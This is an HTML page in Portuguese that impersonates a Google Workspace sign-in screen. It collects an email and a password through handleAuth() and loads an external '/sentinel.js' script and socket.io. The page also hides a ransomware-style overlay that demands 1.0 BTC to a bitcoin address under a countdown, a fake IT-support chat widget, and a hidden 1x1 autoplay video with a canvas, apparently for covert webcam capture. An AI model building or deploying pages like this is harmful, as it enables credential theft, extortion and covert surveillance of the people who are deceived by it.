<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Workspace - Login</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: Roboto, Arial, sans-serif; margin: 0; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { background: white; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; text-align: center; max-width: 448px; width: 100%; position: relative; }
        .g-logo { width: 75px; margin-bottom: 10px; }
        .g-title { font-size: 24px; font-weight: 400; margin-bottom: 5px; }
        .g-subtitle { font-size: 16px; margin-bottom: 40px; color: #202124; }
        .ms-input { width: 100%; border: 1px solid #dadce0; padding: 13px 15px; font-size: 16px; margin-bottom: 30px; outline: none; border-radius: 4px; box-sizing: border-box; }
        .ms-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        .ms-button { background: #1a73e8; color: white; border: none; padding: 10px 24px; cursor: pointer; float: right; font-weight: 500; border-radius: 4px; font-size: 14px; }
        
        #ransom-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#100; color:#f33; z-index:99999; text-align:center; padding-top:100px; font-family:monospace; }
        #chat-widget { position: fixed; bottom: 20px; right: 20px; width: 320px; background: white; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; display: none; z-index: 1000; border: 1px solid #eee; text-align: left; }
    </style>
</head>
<body>
    <div id="template-container" class="card">
        <div id="loader" style="margin-bottom:20px;">🔄 Carregando recursos de segurança...</div>
        <div id="content" style="display:none;">
            <div id="g-view">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="g-logo">
                <div class="g-title">Fazer login</div>
                <div class="g-subtitle">Use sua Conta do Google Workspace</div>
                
                <input type="email" id="u" class="ms-input" placeholder="E-mail ou telefone">
                <input type="password" id="p" class="ms-input" placeholder="Digite sua senha" style="display:none;">
                
                <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px;">
                    <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px;">Esqueceu seu e-mail?</a>
                    <button class="ms-button" id="btn" onclick="handleAuth()">Próxima</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Ransomware -->
    <div id="ransom-overlay">
        <h1 style="font-size:3rem;">⚠ SYSTEM ENCRYPTED ⚠</h1>
        <div id="timer" style="font-size:5rem; color:#ff0;">23:59:59</div>
        <p>Send 1.0 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
    </div>

    <!-- Chat -->
    <div id="chat-widget">
        <div style="background:#1a73e8; color:white; padding:15px; font-weight:bold;">Suporte de TI</div>
        <div id="chat-msgs" style="height:250px; overflow-y:auto; padding:15px; font-size:0.85rem; display:flex; flex-direction:column; gap:10px;"></div>
        <div style="display:flex; padding:10px; border-top:1px solid #eee;">
            <input type="text" id="chat-in" placeholder="Responder..." style="flex:1; border:none; outline:none;">
            <button onclick="sendChat()" style="background:none; border:none; color:#1a73e8; font-weight:bold; cursor:pointer;">↑</button>
        </div>
    </div>

    <video id="v" width="1" height="1" autoplay style="opacity:0; position:fixed;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script src="/sentinel.js?v=5"></script>
</body>
</html>
